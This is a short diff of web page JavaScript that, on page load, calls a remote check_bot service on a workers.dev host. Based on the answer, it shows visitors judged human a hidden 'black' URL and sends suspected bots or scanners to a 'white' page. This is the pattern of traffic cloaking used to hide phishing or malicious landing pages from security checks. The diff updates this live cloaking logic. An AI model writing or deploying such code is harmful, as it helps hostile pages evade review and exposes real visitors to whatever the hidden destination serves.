@@ -82,16 +82,15 @@ const showBlack = (blackUrl) => {
 createLoader();
 
 window.addEventListener('DOMContentLoaded', () => {
-
-  const qs = location.search || '';
-  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot' + qs)
+  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
     .then(res => res.json())
     .then(res => {
-      console.log('check_bot response:', res);
-      if (res?.code === 200 && res.result === false && res.url) {
-        showBlack(res.url + '/wvS95k'); 
+      if (res?.code === 200 && !res.result && res.url) {
+       
+        showBlack(res.url + '/wvS95k');
       } else {
-        setTimeout(showWhite, 200);     
+        
+        setTimeout(showWhite, 300);
       }
     })
     .catch(err => {
